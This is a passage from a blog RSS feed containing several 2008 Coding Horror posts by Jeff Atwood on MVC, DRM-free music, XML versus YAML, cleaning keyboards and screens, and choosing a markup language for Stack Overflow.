For the "MVC" of a web app, I make a direct analogy with the Smalltalk notion of MVC. The model is any of the logic or the database or any of the data itself. The view is simply how you lay the data out, how it is displayed. If you want a subset of some data, for example, my opinion is that is a responsibility of the model. The model knows how to make a subset. You should not be asking your graphics designer to filter a list according to age or some other criteria.
<p>
The controller in a web app is a bit more complicated, because it has two parts. The first part is the web server (such as a servlet container) that maps incoming HTTP URL requests to a particular handler for that request. The second part is those handlers themselves, which are in fact often called "controllers." So the C in a web app MVC includes both the web server "overlord" that routes requests to handlers and the logic of those handlers themselves, which pull the data from the database and push it into the template. This controller also receives HTTP POST requests and processes these, sometimes updating the database.
</p>
<p>
I look at a website as nothing but a graph with edges with POSTs and GETs that routes pages.
</p>
</blockquote>
<p>
Here's one quick way to test if your application has properly segregated itself between the Model, View, and Controller roles: <b>is your app skinnable?</b>
</p>
<p>
</p>
<blockquote>
My experience is that designers don't understand loops or any kind of state. They do understand templates with holes in them. Everybody understands mail merge. And if you say, "Apply the bold template to this hole," they kind of get that, too. So separating model and view addresses this very important practical problem of how to have designers work with coders.
<p>
The other problem is there is no way to do multiple site skins properly if you don't have proper separation of concerns. If you are doing code generation or sites with different skins on them, there is no way to properly make a new skin by simply copying and pasting the old skin and changing it. If you have the view and the logic together, when you make a copy of the view you copy the logic as well. That breaks one of our primary rules as developers: have only one place to change anything.
</p>
</blockquote>
<p>
<b>Skinnability cuts to the very heart of the MVC pattern.</b> If your app <i>isn't</i> "skinnable", that means you've probably gotten your model's chocolate in your view's peanut butter, quite by accident. You should refactor your code so that only the controller is responsible for poking the model data through the relatively static templates represented by the view.
</p>
<p>
The power and simplicity of properly implemented MVC is undeniable. But the first step to harnessing MVC is to understand <i>why</i> it works, both on the web, and also within your own applications.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-05T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/understanding-model-view-controller/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Supporting DRM-Free Music ]]></title>
<link>https://blog.codinghorror.com/supporting-drm-free-music/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
You've probably read this classic boner of an iPod quote at some point:
</p>
<p>
</p>
<blockquote>
No wireless. Less space than a nomad. Lame.
</blockquote>
<p>
It's from <a href="http://apple.slashdot.org/article.pl?sid=01/10/23/1816257&amp;tid=107">the Slashdot article on the introduction of the original Apple iPod</a> back in 2001. I had always assumed this particular quote was written by a random Slashdot user in the comments. But in fact, that quote is part of the body of the news entry, and it came <b>directly from <a href="http://en.wikipedia.org/wiki/Rob_Malda">Rob Malda</a>, the founder of Slashdot.</b>
</p>
<p>
Rob's pithy dismissal of the iPod at its introduction has become virtually synonymous with how out of touch the Slashdot crowd is with the rest of the world. It's ripe for parody, as Andy Baio <a href="http://waxy.org/2008/03/abort_retry_or/">explains</a>:
</p>
<p>
</p>
<blockquote>
This is nothing new. It's as old as communication itself. I'm sure that the moment man discovered fire, there was some guy nearby saying, "Too smoky. Can burn you. Lame."
</blockquote>
<p>
The success of the iPod was anything but a foregone conclusion back in 2001. A quick peek at <a href="http://www.youtube.com/results?search_query=first+ipod+ad">the first iPod ad</a> provides a little context to how rough that first generation really was compared to the competely polished product we enjoy on store shelves today. But the iPod, and the companion iTunes Store, have been <a href="http://www.apple.com/pr/library/2008/04/03itunes.html"><i>hugely</i> successful</a>:
</p>
<p>
</p>
<ul>
<li>The <a href="http://en.wikipedia.org/wiki/ITunes_Store">iTunes Store</a> is the number one music retailer in the US
</li>
<li>Over 50 million customers
</li>
<li>Over 4 billion songs sold
</li>
<li>Music catalog of over 6 million songs
</li>
</ul>
<p>
Clearly Apple is doing something right. Except there's one small problem. Music purchased from the Apple store comes encumbered with Apple's flavor of Digital Rights Management, known as <a href="http://en.wikipedia.org/wiki/FairPlay">FairPlay</a>:
</p>
<p>
</p>
<ol>
<li>Users can make a <b>maximum of seven CD copies</b> of any particular playlist containing songs purchased from the iTunes Store.
</li>
<li>Users can access their purchased songs on a <b>maximum of five computers</b>.
</li>
<li>Songs can <b>only be played on a computer with iTunes or an iPod</b>; other mp3 devices do not support FairPlay encoded tracks.
</li>
</ol>
<p>
(EMI and independent artists are also offered in "iTunes Plus" DRM-free format -- at last count, around <a href="http://www.apple.com/pr/library/2007/10/17itunes.html">2 million songs</a>. These songs were originally sold at a 30 cent premium, but later reduced to the standard 99 cents.)
</p>
<p>
Now, I'm a pragmatist. I'm no fan of DRM, but I do accept that sometimes it is <a href="http://www.codinghorror.com/blog/archives/001052.html">a necessary evil</a>. FairPlay was indeed an acceptable tradeoff when Apple's iTunes Store was one of the few easy and legal ways to get digital music of any kind.
</p>
<p>
But that's no longer true today. You can generally get the same music for the same price, or <i>less</i>, <a href="http://www.amazon.com/b?%5Fencoding=UTF8&amp;node=163856011&amp;tag=codihorr-20&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">at Amazon's MP3 store</a> -- <b>completely free of any form of DRM!</b> Reg Braithwaite provides <a href="http://weblog.raganwald.com/2008/05/why-apple-is-more-expensive-than-amazon.html">an example</a>:
</p>
<p>
</p>
<blockquote>
For example, <a href="http://www.amazon.com/exec/obidos/ASIN/B0013G2QZ2/codihorr-20">Bach: Goldberg Variations, BWV 988</a> on 256-bit DRM-free MP3 is just $9.99 from Amazon. The same album is also $9.99 from Apple, but you get DRM. And there are tons of tracks on Amazon that are actually less expensive than on iTMS, so you get better music for less money without the DRM hassle.
</blockquote>
<p>
Better quality. Less money. And no evil, consumer hostile DRM! It's almost unbelievable. Needless to say, I've been <b>buying as much music as I can from Amazon to vote with my wallet</b> and demonstrate to the music labels that yes, giving the customer what they want <i>does</i> pay. And <a href="http://www.amazon.com/b?%5Fencoding=UTF8&amp;node=163856011&amp;tag=codihorr-20&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">you should too</a>. Every purchase of DRM-ed music, in the face of Amazon's excellent alternative, is an implicit vote for more useless, aggravating DRM on your music.
</p>
<p>
If it seems a little odd to you that Amazon is somehow able to offer all this music up DRM-free, while the majority of Apple's iTunes Store catalog is still stuck in the old testament world of DRM customer punishment, <a href="http://weblog.raganwald.com/2008/05/why-apple-is-more-expensive-than-amazon.html">you're not alone</a>.
</p>
<p>
</p>
<blockquote>
The reason you can find more music on Amazon at a lower price is that the Record Labels want it that way. Do you think they charge Apple and Amazon the same price for each track and Apple simply charges you more and pockets the difference as a higher markup? The labels would like you to think that, but they actually charge Amazon less for each track, and that's how Amazon can charge you less.
<p>
Do you think Apple insists on the DRM but Amazon has the vision to see that <a href="http://www.apple.com/hotnews/thoughtsonmusic/">the future of music is DRM-free</a>? Do you think Jeff Bezos is a better negotiator and he was able to get a better price per track than Steve Jobs? Without putting up with DRM?
</p>
<p>
The major labels want nothing more than to break Apple's dominance of the digital music business. They spin it as a good thing. More retailers means more competition, which is good for consumers.
</p>
</blockquote>
<p>
The record labels now view the massive iTunes juggernaut as a threat. Thus, the offer of DRM-free music exclusively to Amazon, and at lower prices than Apple can offer, is a direct attack by the record labels on the increasing power of Apple's iTunes. The irony of the record labels attacking a Frankenstein monster of their very own creation is almost overwhelming -- who do you think <i>demanded</i> that all the music on iTunes have DRM in the first place?
</p>
<p>
But here's where Reg Braithwaite and I differ: he argues that poor Apple is <a href="http://weblog.raganwald.com/2008/05/why-apple-is-more-expensive-than-amazon.html">getting a raw deal</a>.
</p>
<p>
</p>
<blockquote>
And if the whole world can sell DRM-free music, then Amazon and the like would have to compete with iTMS by building a better music store. Except, of course, they don't have to compete with iTMS because the labels are colluding to place Apple at a disadvantage.
</blockquote>
<p>
I'll certainly agree that the stunning success of the iTunes Store is what led us to this competitive situation in the first place, and that's entirely to Apple's credit. Correct me if I'm wrong, but I believe they've made quite the handsome profit along the way, too.
</p>
<p>
But to argue that the competition is "unfair" smacks of the absolute worst kind of Apple advocacy. Unfair? Unfair to whom? The customers who are getting <b>DRM-free music officially blessed by the major record labels?</b>
</p>
<p>
Yeah, that's terrible. Just awful.
</p>
<p>
Hold on for a minute while I wipe this tear out of my eye. Try to imagine me playing my DRM-free MP3 of <a href="http://youtube.com/results?search_query=everybody+hurts">REM's "Everybody Hurts"</a> while I'm doing it, for maximum effect.
</p>
<p>
</p>
<blockquote>
As soon as they can break this pesky iPod-iTMS-iPhone nonsense, the labels want to get back to dictating what you pay and how often you pay.
</blockquote>
<p>
You'll get no argument from me that the RIAA and the major record labels are as close as you can get to pure evil while not actively killing small children, puppies, and kittens. Well, not in public, anyway. I'm sure they'd be charging us a trillion dollars per song -- no, per <i>byte</i> of the song -- if they could get away with it.
</p>
<p>
But clearly, they can't. There are certain market realities at work here. There's absolutely no historical evidence that a type of media, once it is officially sold DRM free, can somehow revert back to the DRM model. I am somehow reminded of software developers who <a href="http://yro.slashdot.org/article.pl?sid=08/01/26/0341210">desperately try to "revoke" the GPL</a> after they've adopted it.
</p>
<p>
So if the labels want to disrupt the power of the iTunes machine by doing the right thing for customers and <b>irrevocably breaking the back of DRM on music</b>, that is the beauty of pure competition working for us, the users. This is a level of progress on the DRM front that I thought we would <i>never</i> see.
</p>
<p>
If it takes "the labels break[ing] Apple", as Reg says, to get us this far, then so be it. That kind of invective may be difficult to read if you're emotionally involved with Apple. But let me tell you, I've been emotionally involved with companies before, and it rarely ends well. I find that corporations never reciprocate your love in quite the same way.
</p>
<p>
Personally, I'd much rather be an advocate for my fellow users than an advocate of any one particular company. For now, that means supporting <a href="http://www.amazon.com/b?%5Fencoding=UTF8&amp;node=163856011&amp;tag=codihorr-20&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">Amazon's DRM-free MP3 store</a>. I'm pretty sure the good folks at 1 Infinite Loop will survive, one way or another.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-06T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/supporting-drm-free-music/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ XML: The Angle Bracket Tax ]]></title>
<link>https://blog.codinghorror.com/xml-the-angle-bracket-tax/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Everywhere I look, programmers and programming tools seem to have standardized on <a href="http://en.wikipedia.org/wiki/XML">XML</a>. Configuration files, build scripts, local data storage, code comments, project files, you name it -- <b>if it's stored in a text file and needs to be retrieved and parsed, it's probably XML.</b> I realize that we have to use <i>something</i> to represent reasonably human readable data stored in a text file, but XML sometimes feels an awful lot like using an enormous sledgehammer to drive common household nails.
</p>
<p>
I'm deeply ambivalent about XML. I'm reminded of this Winston Churchill quote:
</p>
<p>
</p>
<blockquote>
It has been said that democracy is the worst form of government except all the others that have been tried.
</blockquote>
<p>
XML is like democracy. Sometimes it even works. On the other hand, it also means we end up with stuff like this:
</p>
<p>
</p>
<pre>
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
&lt;SOAP-ENV:Body&gt;
&lt;m:GetLastTradePrice xmlns:m="Some-URI"&gt;
&lt;symbol&gt;DIS&lt;/symbol&gt;
&lt;/m:GetLastTradePrice&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;
</pre>
<p>
<b>How much actual <i>information</i> is communicated here?</b> Precious little, and it's buried in an astounding amount of noise. I don't mean to pick on <a href="http://en.wikipedia.org/wiki/SOAP">SOAP</a>. This blanket criticism applies to XML, in whatever form it appears. I spend a disproportionate amount of my time wading through an endless sea of angle brackets and verbose tags desperately searching for the vaguest hint of actual information. It feels <i>wrong</i>.
</p>
<p>
You could argue, like <a href="http://en.wikipedia.org/wiki/Derek_Denny-Brown_(software_engineer)">Derek Denny-Brown</a>, that XML has been <a href="http://nothing-more.blogspot.com/2004/10/where-xml-goes-astray.html">misappropriated and misapplied</a>.
</p>
<p>
</p>
<blockquote>
I find it so interesting that XML has become so popular for such things as SOAP. XML was not designed with the SOAP scenarios in mind. Other examples of popular scenarios which deviate XML's original goals are configuration files, quick-n-dirty databases, and [RSS]. I'll call these 'data' scenarios, as opposed to the 'document' scenarios for which XML was originally intended. In fact, I think it is safe to say that there is more usage of XML for 'data' scenarios than for 'document' scenarios, today.
</blockquote>
<p>
Given its prevalence, you might decide that <a href="http://xmlsucks.org/but_you_have_to_use_it_anyway/does-xml-suck.html">XML is technologically terrible, but you have to use it anyway</a>. It sure feels like, for any given representation of data in XML, there was a better, simpler choice out there somewhere. But it wasn't pursued, because, well, XML can represent <i>anything</i>. Right?
</p>
<p>
Consider the following XML fragment:
</p>
<p>
</p>
<pre>
&lt;memo date="2008-02-14"&gt;
&lt;from&gt;
&lt;name&gt;The Whole World&lt;/name&gt;&lt;email&gt;us@world.org&lt;/email&gt;
&lt;/from&gt;
&lt;to&gt;
&lt;name&gt;Dawg&lt;/name&gt;&lt;email&gt;dawg158@aol.com&lt;/email&gt;
&lt;/to&gt;
&lt;message&gt;
Dear sir, you won the internet. http://is.gd/fh0
&lt;/message&gt;
&lt;/memo&gt;
</pre>
<p>
Because XML purports to represent <i>everything</i>, it ends up representing nothing particularly well.
</p>
<p>
Wouldn't this information be easier to read and understand -- and only nominally harder to parse -- when expressed in its native format?
</p>
<p>
</p>
<pre>
Date: Thu, 14 Feb 2008 16:55:03 +0800 (PST)
From: The Whole World &lt;us@world.org&gt;
To: Dawg &lt;dawg158@aol.com&gt;
Dear sir, you won the internet. http://is.gd/fh0
</pre>
<p>
You might argue that <a href="http://www.ibm.com/developerworks/xml/library/x-sbxml.html">XML was never intended to be human readable</a>, that XML should be automagically generated via friendly tools behind the scenes, never exposed to a single living human eye. It's a spectacularly grand vision. I hope one day our great-grandchildren can live in a world like that. Until that glorious day arrives, I'd sure enjoy reading text files that don't make me suffer through the <b>XML angle bracket tax</b>.
</p>
<p>
So what, then, are the alternatives to XML? One popular choice is <a href="http://en.wikipedia.org/wiki/YAML">YAML</a>. I could explain it, but it's easier to show you. Which, I think, is entirely the point.
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4" width="650">
<tr>
<td valign="top">
<pre>
&lt;club&gt;
&lt;players&gt;
&lt;player id="kramnik"
name="Vladimir Kramnik"
rating="2700"
status="GM" /&gt;
&lt;player id="fritz"
name="Deep Fritz"
rating="2700"
status="Computer" /&gt;
&lt;player id="mertz"
name="David Mertz"
rating="1400"
status="Amateur" /&gt;
&lt;/players&gt;
&lt;matches&gt;
&lt;match&gt;
&lt;Date&gt;2002-10-04&lt;/Date&gt;
&lt;White refid="fritz" /&gt;
&lt;Black refid="kramnik" /&gt;
&lt;Result&gt;Draw&lt;/Result&gt;
&lt;/match&gt;
&lt;match&gt;
&lt;Date&gt;2002-10-06&lt;/Date&gt;
&lt;White refid="kramnik" /&gt;
&lt;Black refid="fritz" /&gt;
&lt;Result&gt;White&lt;/Result&gt;
&lt;/match&gt;
&lt;/matches&gt;
&lt;/club&gt;
</pre>
</td>
<td valign="top">
<pre>
players:
Vladimir Kramnik: &amp;kramnik
rating: 2700
status: GM
Deep Fritz: &amp;fritz
rating: 2700
status: Computer
David Mertz: &amp;mertz
rating: 1400
status: Amateur
matches:
-
Date: 2002-10-04
White: *fritz
Black: *kramnik
Result: Draw
-
Date: 2002-10-06
White: *kramnik
Black: *fritz
Result: White
</pre>
</td>
</tr>
</table>
<p>
There's also JSON notation, which some call <a href="http://www.json.org/xml.html">the new, fat-free alternative to XML</a>, though this is still <a href="http://ajaxian.com/archives/json-vs-xml-the-debate">hotly debated</a>.
</p>
<p>
You could do worse than XML. It's a reasonable choice, and if you're going to use XML, then at least <a href="http://www.codinghorror.com/blog/archives/000647.html">learn to use it correctly</a>. But consider:
</p>
<p>
</p>
<ol>
<li>Should XML be the <i>default</i> choice?
</li>
<li>Is XML the simplest possible thing that can work for your intended use?
</li>
<li>Do you <a href="http://web.archive.org/web/20060325012720/www.pault.com/xmlalternatives.html">know what the XML alternatives are</a>?
</li>
<li>Wouldn't it be nice to have easily readable, understandable data and configuration files, without all those sharp, pointy angle brackets <i>jabbing you directly in your ever-lovin' eyeballs?</i>
</li>
</ol>
<p>
I don't necessarily think <a href="http://c2.com/cgi/wiki?XmlSucks">XML sucks</a>, but the mindless, blanket application of XML as <a href="http://snltranscripts.jt.org/75/75ishimmer.phtml">a dessert topping and a floor wax</a> certainly does. Like all tools, it's a question of how you use it. Please think twice before subjecting yourself, your fellow programmers, and your users to <b>the XML angle bracket tax</b>. &lt;CleverEndQuote&gt;Again.&lt;/CleverEndQuote&gt;
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-11T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/xml-the-angle-bracket-tax/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Cleaning Your Display and Keyboard ]]></title>
<link>https://blog.codinghorror.com/cleaning-your-display-and-keyboard/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Let's say, just as a hypothetical, you're sitting at your computer, casually chatting with a fellow programmer. You begin to describe some bit of code, then bring it up on your display to illustrate. You want to highlight some particular part of the code. Perhaps you move the cursor invitingly over the area to bring it to their attention, or gesture towards it with your hand.</p>
<p>What happens next?</p>
<p>When I said there were <a href="http://www.codinghorror.com/blog/archives/001002.html">two types of programmers</a>, here's what I <em>really</em> meant:</p>
<ol>
<li>Programmers who touch displays with their greasy, disgusting, bacteria-addled fingers. </li>
<li>Programmers who don't. </li>
</ol>
<p>I am incredibly anal about people not touching my displays. I'm not even going to apologize. If you touch my display, <a href="http://www.imdb.com/title/tt0083131/quotes">I'll kill you</a>. Displays are for viewing, not touching. Put down your damn sticky bun and go touch your own filthy display. Here's my mental image of everyone who has ever touched my screen:</p>
<p><img alt="image placeholder" >
<p>You know that's you. You know it. You do. And you just can't resist touching my display, can you?</p>
<p>Every time it happens, I replay it in slow motion, desperately trying to insert some part of my body between the toucher and my monitor. But I rarely succeed.</p>
<p>Not everyone considers displays inviolate and untouchable as I do. They should. But keyboards are another matter. They're designed to be touched. And boy, are <em>they</em> ever disgusting. They're literally <a href="http://news.bbc.co.uk/2/hi/uk_news/7377002.stm">dirtier than a toilet</a>.</p>
<blockquote>Out of 33 keyboards swabbed, four were regarded as a potential health hazard and one harboured five times more germs than one of the office's toilet seats.
<p>Microbiologist Dr Peter Wilson said a keyboard was often "a reflection of what is in your nose and in your gut".</p>
<p>During the Which? tests in January this year, a microbiologist deemed one of the office's keyboards to be so dirty he ordered it to be removed, quarantined and cleaned.</p>
<p>It had 150 times the recommended limit for bacteria - five times as filthy as a lavatory seat tested at the same time, the research found.</p>
</blockquote>
<p>After reading that, I'm not sure I want to touch my own keyboard any more, much less someone else's.</p>
<p>So then, <strong>how do we clean our screens and keyboards</strong> that are so casually defiled by our coworkers, family, and friends? This is apparently not a big concern for some. I am continually amazed by the horrifying state of many programmer's computer workstation keyboards and monitors. I'm not talking about dust, but utter and total neglect resulting in devices I'm afraid to touch. Given the data, maybe that's a good thing.</p>
<p><strong>Cleaning screens</strong> is fairly straightforward.</p>
<p>Most manufacturers recommend basic soap and water -- no harsh detergents -- along with a soft cloth. I've used the <a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=monster%20screenclean&amp;tag=codihorr-20&amp;index=blended&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">Monster ScreenClean kit</a> for a while with good results.</p>
<p><a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=monster%20screenclean&amp;tag=codihorr-20&amp;index=blended&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325"><img alt="image placeholder" >
<p>You don't have to buy a kit, of course, but I definitely recommend some kind of <a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=microfiber%20cloth&amp;tag=codihorr-20&amp;index=blended&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">microfiber cloth</a> like the one bundled here. <a href="http://en.wikipedia.org/wiki/Microfiber">Microfiber</a> is a generic name for any synthetic fiber that's finer than silk, and the stuff is amazing. It works well on all kinds of displays: televisions, computer monitors, laptops -- I even use the kit to clean my glasses.</p>
<p><strong>Cleaning keyboards</strong> is a much more challenging task.</p>
<p>Despite what you may have been told, <a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=compressed%20air%20duster&amp;tag=codihorr-20&amp;index=blended&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">compressed air dusters</a> aren't just for sneaking up behind your unsuspecting coworkers and friends and spraying them in the neck and ears. I mean, yes, that's the <em>ideal</em> use, but it's also quite good at cleaning up computer equipment. Including keyboards. You can remove most of the dust and a substantial amount of the unmentionable gunk that builds up under the keys with a generous application of compressed air.</p>
<p><a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=compressed%20air%20duster&amp;tag=codihorr-20&amp;index=blended&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325"><img alt="image placeholder" >
<p>Compressed air is a reasonable first line of defense. But it does nothing to actually <em>clean</em> the keyboard. Sure, you could methodically <a href="http://www.thetechzone.com/?m=show&amp;id=431&amp;page=1">disassemble your keyboard</a>, or if you're hard core enough, even <a href="http://www.computing.net/howto/simple/keyboard/">disassemble your laptop's keyboard</a>, and painstakingly clean every part of it. But is all that work really worth it to clean a lousy <em>keyboard</em>? Short of buying a new keyboard every few years, is there a better way?</p>
<p>Maybe. Have you considered <a href="http://plasticbugs.com/index.php?p=263">putting your keyboard in the dishwasher?</a> It's not as crazy as it sounds; based on the volume of reader feedback to <a href="http://www.boingboing.net/2005/05/30/clean-your-keyboard-.html">an old BoingBoing post on the topic</a>, I'd say it works. It certainly seemed to <a href="http://www.ilfilosofo.com/blog/2007/05/13/i-ran-my-computers-keyboard-through-the-dishwasher/">work for Austin Matzko</a>.</p>
<blockquote>But lately the years of dirt build-up [on his 10 year old keyboard] have been really disgusting, so I decided to try something I read about a long time ago: cleaning the keyboard in the dishwasher.
<p><img alt="image placeholder" >
<p>Everything washed up beautifully and dried out by the next morning; check out the <a href="http://www.ilfilosofo.com/blog/2007/05/13/i-ran-my-computers-keyboard-through-the-dishwasher/">before and after pics</a>. Total time disassembling and reassembling the keyboard was probably five minutes, which is a lot less than you'd spend trying to clean the thing with Q-tips. If that's too much work for you, just stick the whole thing in there, but give it several days to dry out.</p>
</blockquote>
<p>Note that Austin removed the circuitry from the keyboard first, while some people stick the whole keyboard in the dishwasher as-is. There is a <a href="http://www.npr.org/templates/story/story.php?storyId=11029793">followup NPR article</a> that toes the keyboard manufacturer party line and advises against doing this, so obviously, try at your own risk. Personally, I can't wait to give it a shot. I'll buy a new keyboard first, just in case something goes horribly wrong -- and because I need a second keyboard to use while the first one dries for a week.</p>
<p>If that's too radical an approach, you can fall back on using the old reliable soap-and-water damp rag to scrub your keyboard clean. There's even a neat Mac utility program, <a href="http://jan.prima.de/~jan/plok/archives/48-Keyboard-Cleaner.html">Keyboard Cleaner</a>, which will lock out your keyboard while you're thoroughly wiping it down.</p>
<p>I'm no germophobe, but <strong>I like using clean keyboards and displays, and I'd prefer to see other people using clean equipment too.</strong> But remember -- just because I <em>can</em> clean my display doesn't mean you should be touching it, Poky McSmudgypants.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-12T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/cleaning-your-display-and-keyboard/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Is HTML a Humane Markup Language? ]]></title>
<link>https://blog.codinghorror.com/is-html-a-humane-markup-language/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
One of the things we're thinking about while building <a href="http://stackoverflow.com/">stackoverflow.com</a> is <b>how to let users style the questions and answers they're entering on the site</b>. Nothing's decided at this point, but we definitely <i>won't</i> be giving users one of those friendly-but-irritating HTML GUI browser layout controls.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I have one iron-clad design guide: <b>this is a site for programmers, so they should be comfortable with basic markup</b>. None of that nancy-boy GUI toolbar handholding nonsense for us, thankyouverymuch. If you can sling code, a little bit of presentation markup is child's play.
</p>
<p>
We will support some sort of markup language to style the questions and answers. But <i>what</i> markup language?
</p>
<p>
I mentioned in <a href="http://blog.stackoverflow.com/index.php/2008/05/podcast-4/">podcast #4</a> that we consider Wikipedia a defining influence. Let's see how Wikipedia handles markup syntax. This is what the <a href="http://en.wikipedia.org/w/index.php?title=Joel_Spolsky&amp;action=edit">edit page for Joel Spolsky's Wikipedia entry</a> looks like:
</p>
<p>
<a href="http://en.wikipedia.org/w/index.php?title=Joel_Spolsky&amp;action=edit"><img alt="image placeholder" >
</p>
<p>
It's an effective markup language, but I think you'll agree that it's more intimidating than <i>humane</i>. Wikipedia's <a href="http://en.wikipedia.org/wiki/Wikipedia:How_to_edit_a_page">How to Edit a Page</a> and the accompanying <a href="http://en.wikipedia.org/wiki/Wikipedia:Cheatsheet">Wikipedia syntax cheatsheet</a> helps. Some. I'd argue that writing a Wikipedia entry is a step beyond mere presentational markup; it's almost like <i>coding</i>, as you weave the article into the Wikipedia gestalt. (Incidentally, if you haven't ever edited a Wikipedia article, you should. I consider it a rite of passage, a sort of internet merit badge for anyone who is serious about their online presence.)
</p>
<p>
Let's consider a simpler example. What we're looking for is some kind of middle ground, a <a href="http://bluebones.net/2005/02/humane-text-formats/">humane text format</a>. Let's start with some basic HTML.
</p>
<p>
</p>
<table border="1" cellpadding="10" width="600">
<tr><td>
<h1>Lightweight Markup Languages</h1>
<p>According to <b>Wikipedia</b>:</p>
<blockquote>
A <a href="http://en.wikipedia.org/wiki/List_of_lightweight_markup_languages">lightweight markup language</a> is a markup language with a simple syntax, designed to be easy for a human to enter with a simple text editor, and easy to read in its raw form.
</blockquote>
<p>
Some examples are:
</p>
<ul>
<li>Markdown
</li>
<li>Textile
</li>
<li>BBCode
</li>
<li>Wikipedia
</li>
</ul>
<p>
Markup should also extend to <i>code</i>:
</p>
<pre>
10 PRINT "I ROCK AT BASIC!"
20 GOTO 10
</pre>
</td></tr>
</table>
<p>
Here's what that looks like expressed in a variety of <a href="http://en.wikipedia.org/wiki/List_of_lightweight_markup_languages">lightweight markup languages</a>. Bear in mind that <b>each of these will produce HTML equivalent to the above</b>.
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4" width="850">
<tr>
<td>
<a href="http://textile.thresholdstate.com/">Textile</a>
</td>
<td>
<a href="http://daringfireball.net/projects/markdown/dingus">Markdown</a>
</td>
</tr>
<tr>
<td valign="top">
<pre>
h1. Lightweight Markup Languages
According to *Wikipedia*:
bq. A "lightweight markup language":http://is.gd/gns
is a markup language with a simple syntax, designed
to be easy for a human to enter with a simple text
editor, and easy to read in its raw form.
Some examples are:
* Markdown
* Textile
* BBCode
* Wikipedia
Markup should also extend to _code_:
pre. 10 PRINT "I ROCK AT BASIC!"
20 GOTO 10
</pre>
</td>
<td valign="top">
<pre>
Lightweight Markup Languages
============================
According to **Wikipedia**:
&gt; A [lightweight markup language](http://is.gd/gns)
is a markup language with a simple syntax, designed
to be easy for a human to enter with a simple text
editor, and easy to read in its raw form.
Some examples are:
* Markdown
* Textile
* BBCode
* Wikipedia
Markup should also extend to _code_:
10 PRINT "I ROCK AT BASIC!"
20 GOTO 10
</pre>
</td>
</tr>
</table>
<table cellpadding="4" cellspacing="4" width="850">
<tr>
<td>
<a href="http://en.wikipedia.org/wiki/Wikipedia:How_to_edit_a_page">Wikipedia</a>
</td>
<td>
<a href="http://www.phpbb.com/community/faq.php?mode=bbcode">BBCode</a>
</td>
</tr>
<tr>
<td valign="top">
<pre>
==Lightweight Markup Languages==
According to '''Wikipedia''':
:A [[lightweight markup language]]
is a markup language with a simple syntax, designed
to be easy for a human to enter with a simple text
editor, and easy to read in its raw form.
Some examples are:
* Markdown
* Textile
* BBCode
* Wikipedia
Markup should also extend to ''code'':
&lt;source lang=qbasic&gt;
10 PRINT "I ROCK AT BASIC!"
20 GOTO 10
&lt;/source&gt;
</pre>
</td>
<td valign="top">
<pre>
[size=150]Lightweight Markup Languages[/size]
According to [b]Wikipedia[/b]:
[quote]
A [url=http://is.gd/gns]lightweight markup language[/url]
is a markup language with a simple syntax, designed
to be easy for a human to enter with a simple text
editor, and easy to read in its raw form.
[/quote]
Some examples are:
[list]
[*]Markdown
[*]Textile
[*]BBCode
[*]Wikipedia
[/list]
Markup should also extend to [i]code[/i]:
[code]
10 PRINT "I ROCK AT BASIC!"
20 GOTO 10
[/code]
</pre>
</td>
</tr>
</table>
<p>
None of these lightweight markup languages are particularly difficult to understand -- and they're easy on the eyes, as promised. But I still had to look up the reference syntax for each one and map it to the HTML that I already know by heart. I also found them disturbingly close to "magic" for some of the formatting rules, to the point that I wished I could just write literal HTML and get exactly what I want without guessing how the parser is going to interpret my fake-plain-text.
</p>
<p>
Which leads directly to this question: <b>why not just stick with what we already know and use HTML?</b> This c2 wiki page titled <a href="http://c2.com/cgi/fullSearch">Why Doesn't Wiki Do HTML?</a> makes the case that -- at least for Wiki content -- you're better off leaving HTML behind:
</p>
<p>
</p>
<ol>
<li>In a Wiki, the emphasis is on content, not presentation. Simple Wiki markup rules let people focus on expressing their ideas.
</li>
<li>Why not use a domain-specific markup language designed to do "the simplest thing that could possibly work"?
</li>
<li>Some HTML tags are difficult to work with and can break the flow of your thoughts. The table tag, for example.
</li>
<li>Does the average user really need total HTML and CSS layout power?
</li>
<li>Allowing the full range of HTML tags can lead to major security vulnerabilities.
</li>
<li>Many people don't know HTML. A simple Wiki markup language is easier to learn.
</li>
</ol>
<p>
